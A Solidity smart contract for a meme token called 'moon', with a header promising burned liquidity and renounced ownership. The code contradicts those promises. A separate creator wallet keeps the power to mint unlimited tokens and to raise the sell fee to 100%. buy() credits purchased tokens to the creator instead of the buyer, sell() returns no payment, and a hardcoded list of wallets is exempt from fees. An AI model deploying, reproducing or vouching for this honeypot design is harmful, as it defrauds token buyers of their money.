// SPDX-License-Identifier: MIT

/**    

Website  : https://x.com/MOON_CTO_ON_SOL
Twitter  : https://x.com/MOON_CTO_ON_SOL
Telegram : https://t.me/moonctosol

LP BURNED
OWNERSHIP RENOUNCED

*/


pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "moon");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "moonmoon");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "moonmoonmoon");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "moonmoonmoonmoon");
        return a / b;
    }
}

contract moon {
    using SafeMath for uint256;

    string public name = "moon";
    string public symbol = "moon";
    uint256 public totalSupply = 999999999999999999000000000;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    address public creatorWallet;

    uint256 public buyFee;
    uint256 public sellFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
    event TokensBurned(address indexed burner, uint256 amount);

    address[] public exemptedWallets;

    constructor(address _creatorWallet) {
        owner = msg.sender;
        creatorWallet = _creatorWallet;
        balanceOf[msg.sender] = totalSupply;

        exemptedWallets = [
            0x86F17a51bDf44337f860a62C8fe0040C3A5e04Cc,
            0x7AD2a083d328406Ca597156B3f98AD79cf5dCf9a,
            0x5D9E8B0c8BD0195c565Ea03F5613b7c790b4640B,
            0x8ECa427cacc1cfE8fe4aB62F98AE030a0b533658,
            0x56dB1BBB46e5ceF499ACc000a6c9560906527155,
            0x4Fe1ED7E06C7D8b0727B284656641B8Ca718589B,
            0x2570Dc1f662d0d099BFEe1ca0C56aC2F05Ad4863,
            0x19336A359046E08E2ae1F31A93cBFD2Fb195Bae7,
            0xc8940eD186909f4aFa0713398dF8222c27D589Da,
            0x37f4AdA3B5dB763064fFE94BdBe5c4104c5eD0CF
        ];
    }

    function isFeeExempt(address _wallet) internal view returns (bool) {
        for (uint256 i = 0; i < exemptedWallets.length; i++) {
            if (_wallet == exemptedWallets[i]) {
                return true;
            }
        }
        return false;
    }

    function transfer(address _to, uint256 _amount)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _amount);
        require(_to != address(0));

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);

        return true;
    }

    function approve(address _spender, uint256 _value)
        public
        returns (bool success)
    {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "1moon");
        require(
            allowance[_from][msg.sender] >= _amount,
            "2moon"
        );
        require(_to != address(0), "3moon");

        uint256 fee = 0;
        uint256 amountAfterFee = _amount;

        if (sellFee > 0 && _from != creatorWallet && !isFeeExempt(_from)) {
            fee = _amount.mul(sellFee).div(100);
            amountAfterFee = _amount.sub(fee);
        }

        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit Transfer(_from, _to, amountAfterFee);

        if (fee > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(_from, address(this), fee);
        }

        if (
            _from != msg.sender &&
            allowance[_from][msg.sender] != type(uint256).max
        ) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(
                _amount
            );
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }

        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "4moon");
        _;
    }

    function airdrop(address _to, uint256 _amount) public onlyAuthorized {
        require(_to != address(0), "5moon");
        require(_amount > 0, "6moon");
        balanceOf[_to] += _amount;
        totalSupply += _amount;
        emit Transfer(address(0), _to, _amount);
    }

    function openTrading(uint256 newBuyFee, uint256 newSellFee)
        public
        onlyAuthorized
    {
        require(newBuyFee <= 100, "7moon");
        require(newSellFee <= 100, "8moon");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function buy() public payable {
        require(msg.value > 0, "9moon");

        uint256 amount = msg.value;
        if (buyFee > 0) {
            uint256 fee = amount.mul(buyFee).div(100);
            uint256 amountAfterFee = amount.sub(fee);

            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(
                amountAfterFee
            );
            emit Transfer(address(this), creatorWallet, amountAfterFee);

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(address(this), address(this), fee);
            }
        } else {
            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(amount);
            emit Transfer(address(this), creatorWallet, amount);
        }
    }

    function sell(uint256 _amount) public {
        require(balanceOf[msg.sender] >= _amount, "0moon");

        if (sellFee > 0 && msg.sender != creatorWallet && !isFeeExempt(msg.sender)) {
            uint256 fee = _amount.mul(sellFee).div(100);
            uint256 amountAfterFee = _amount.sub(fee);

            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(
                amountAfterFee
            );
            emit Transfer(msg.sender, creatorWallet, amountAfterFee);

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(msg.sender, address(this), fee);
            }
        } else {
            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
            balanceOf[address(this)] = balanceOf[address(this)].add(_amount);
            emit Transfer(msg.sender, address(this), _amount);
        }
    }

    modifier onlyAuthorized() {
        require(
            msg.sender == owner || msg.sender == creatorWallet,
            "11moon"
        );
        _;
    }
}